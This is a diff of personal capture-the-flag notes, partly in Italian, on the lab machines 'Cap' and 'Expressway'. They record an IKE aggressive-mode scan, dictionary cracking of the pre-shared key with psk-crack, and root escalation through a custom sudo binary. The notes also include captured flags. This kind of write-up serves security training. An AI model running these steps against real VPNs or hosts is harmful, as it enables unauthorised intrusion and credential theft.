@@ -1,6 +1,5 @@
 # Machine 'Cap'
-
-  IP: 10.10.10.245
+IP: 10.10.10.245
 
   #On the webpage path '/data/0' we can obtain a pcap file that has ftp credential  
   user:nathan
@@ -22,3 +21,72 @@
   #di Python e così aprire una shell con UID 0 (root).
   
   root flag: 6ee076faf1df4a3e474cc348f6a3d5a4
+
+######################################################################################################################
+
+# Machine 'Expressway'
+IP: 10.10.11.87
+
+  nmap -sU -p 500 --script ike-version 10.10.11.87
+  PORT    STATE SERVICE
+  500/udp open  isakmp
+  | ike-version: 
+  |   attributes: 
+  |     XAUTH
+  |_    Dead Peer Detection v1.0
+
+#ISAKMP è un protocollo per lo scambio sicuro di chiavi nelle comunicazioni VPN.
+
+  └─$ sudo ike-scan -A 10.10.11.87
+  Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+  10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=a6f6245443e61188) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) 
+                  KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 
+                  (Dead Peer Detection v1.0) Hash(20 bytes)
+
+#Da notare: l'ID restituito contiene l'utenza e il domain di risoluzione: ike@expressway.htb
+
+  └─$ ike-scan -A --pskcrack 10.10.11.87
+  Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+  10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=6b817c7325c48b7e) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) 
+                  KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100
+                  (Dead Peer Detection v1.0) Hash(20 bytes)
+
+  IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+  49bebb4cad8b0cdb63ab50996c4d54183538df931d06b63ffcacf20e7b9e07e6859095f8a8b011a17fbe85eaedbf92fffde5bda
+  Ending ike-scan 1.9.6: 1 hosts scanned in 0.138 seconds (7.26 hosts/sec).  1 returned handshake; 0 returned notify
+
+#Output (estratto): handshake con ID ike@expressway.htb e una stringa PSK parameters.
+#Ho salvato la stringa IKE PSK in un file (pass.psk) e l'ho sottoposta a cracking tramite psk-crack con la wordlist rockyou.txt:
+
+  └─$ psk-crack --dictionary=/usr/share/wordlists/rockyou.txt  pass.psk 
+  Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+  Running in dictionary cracking mode
+  key "f***********" matches SHA1 hash a246ea6483c6a0be893459dc12bc420434961791
+  Ending psk-crack: 8045040 iterations in 3.518 seconds (2286710.91 iterations/sec)
+
+#Usando l'ID utente rilevato e la PSK, ci si connette
+  ike@expressway:~$ cat user.txt 
+  7f8c6c0282c8db8***************
+
+  ike@expressway:~$ sudo -l
+  [sudo] password for ike: f***********
+  Sorry, user ike may not run sudo on expressway.
+#Osservazione importante: il messaggio di errore è personalizzato, suggerendo che il binario sudo è stato alterato o sostituito.
+
+  ike@expressway:~$ which sudo
+  /usr/local/bin/sudo
+
+#Conclusione esiste una versione custom di sudo in /usr/local/bin (probabilmente SUID-root). Questo è un vettore di escalation rilevante.
+
+  ike@expressway:~$ groups 
+  ike proxy
+
+#L'utente appartiene al gruppo proxy. Nei log di Squid (/var/log/squid/) è presente un hostname interno rilevante (offramp.expressway.htb o simile). 
+#Poiché il sudo custom sembra verificare l'username e consente l'esecuzione di comandi con un parametro (ost), possiamo sfruttare questa caratteristica.
+
+  ike@expressway:/var/log/squid$ /usr/local/bin/sudo -h offramp.expressway.htb sudo su
+  
+  root@expressway:~# cat root.txt 
+  d3d33e456c1467b***************
+
+######################################################################################################################
